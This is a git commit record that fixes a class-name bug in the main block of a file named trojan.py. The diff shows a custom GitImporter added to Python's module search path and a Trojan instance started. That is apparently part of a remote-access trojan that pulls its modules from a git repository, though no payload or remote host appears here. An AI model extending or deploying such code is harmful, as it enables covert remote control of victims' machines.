d2040218a7477aa6fe3fc1328be3e4c8b3d8d9fd
RealIrox100 <superstarfart02@gmail.com>
2026-09-24 17:00:39 -0400

    Fix class name from 'trojan' to 'Trojan'

--- trojan.py
+++ trojan.py
@@ -92,5 +92,5 @@ if __name__ == '__main__':
     # Add the GitImporter to the system's module search path
     sys.meta_path.append(GitImporter())
     # Create a Trojan instance with a specific ID and run it
-    trojan = trojan('abc')
+    trojan = Trojan('abc')
     trojan.run()
